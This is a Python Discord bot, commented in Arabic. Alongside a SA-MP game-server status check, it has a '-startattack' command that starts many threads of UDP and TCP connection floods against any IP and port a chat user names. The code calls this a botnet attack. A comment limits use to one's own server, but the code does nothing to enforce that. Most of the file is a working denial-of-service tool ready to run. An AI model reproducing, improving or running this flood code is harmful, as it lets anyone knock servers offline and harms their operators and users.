import discord
from discord.ext import commands
import socket
import random
import threading

# =========================
# إدخال التوكن من المستخدم عند التشغيل
# =========================
bot_token = input("أدخل توكن البوت هنا: ")

# =========================
# إعداد البوت
# =========================
intents = discord.Intents.default()
intents.message_content = True  # تفعيل الوصول لمحتوى الرسائل
bot = commands.Bot(command_prefix="-", intents=intents)

# =========================
# دالة لفحص حالة السيرفر عبر بروتوكول UDP
# =========================
def check_samp_status(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(5)
        s.sendto(b'\xFF\xFF\xFF\xFF\x02', (ip, port))
        data, addr = s.recvfrom(1024)
        if data:
            return "السيرفر متصل ورد بنجاح!"
        else:
            return "فشل الاتصال بالخادم!"
    except socket.timeout:
        return "فشل الاتصال بالخادم - مهلة!"
    except Exception as e:
        return f"خطأ: {str(e)}"

# =========================
# أمر البوت لفحص السيرفر
# =========================
@bot.command(name="sampstatus")
async def sampstatus(ctx, ip: str, port: int):
    await ctx.send(f"جارٍ فحص حالة السيرفر {ip}:{port}...")
    status = check_samp_status(ip, port)
    await ctx.send(f"نتيجة الفحص: {status}")

# =========================
# دوال هجوم (الاستخدام على سيرفرك فقط)
# =========================
def syn_flood(ip, port):
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            print(f"{i} SYN Attack Sent!!!")
        except:
            print("[*] Error!!!")

def udp_flood(ip, port):
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip), int(port))
            s.sendto(data, addr)
            print(f"{i} UDP Attack Sent!!!")
        except:
            print("[!] Error!!!")

def tcp_flood(ip, port):
    data = random._urandom(1024)
    i = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            print(f"{i} TCP Attack Sent!!!")
        except:
            print("[*] Error!!!")

def botnet_attack(ip, port, threads):
    for y in range(threads):
        th = threading.Thread(target=syn_flood, args=(ip, port))
        th.start()
        th = threading.Thread(target=udp_flood, args=(ip, port))
        th.start()
        th = threading.Thread(target=tcp_flood, args=(ip, port))
        th.start()

# =========================
# أمر البوت لتشغيل الهجوم
# =========================
@bot.command(name="startattack")
async def start_attack(ctx, ip: str, port: int, threads: int):
    await ctx.send(f"Starting attack on {ip}:{port} with {threads} threads...")
    botnet_attack(ip, port, threads)

# =========================
# تشغيل البوت
# =========================
bot.run(bot_token)
